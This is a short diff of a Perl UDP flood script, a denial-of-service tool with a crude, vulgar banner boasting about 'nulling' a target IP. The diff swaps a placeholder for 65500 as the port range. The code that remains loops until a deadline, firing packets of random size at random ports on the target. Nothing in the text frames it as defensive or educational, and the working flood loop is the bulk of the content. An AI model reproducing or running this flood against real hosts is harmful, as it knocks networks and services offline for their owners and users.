@@ -40,12 +40,12 @@ print BOLD RED<<EOTEXT;
 EOTEXT
 
 print "MemeCFW and The Bat Dropped Yo Shit $ip " . ($port ? $port : "Sucking The Clit") . " With " . 
-  ($size ? "$size-Slammed" : "sikeratarmapusyatar") . "Bots" . 
+  ($size ? "$size-Slammed" : "65500") . "Bots" . 
   ($time ? " for $time seconds" : "") . "\n";
 print "Stop NULLING With Ctrl-C\n" unless $time;
  
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
-  $pport = $port ? $port : int(rand(sikeratarmapusyatar))+1;
+  $pport = $port ? $port : int(rand(65500))+1;
  
   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
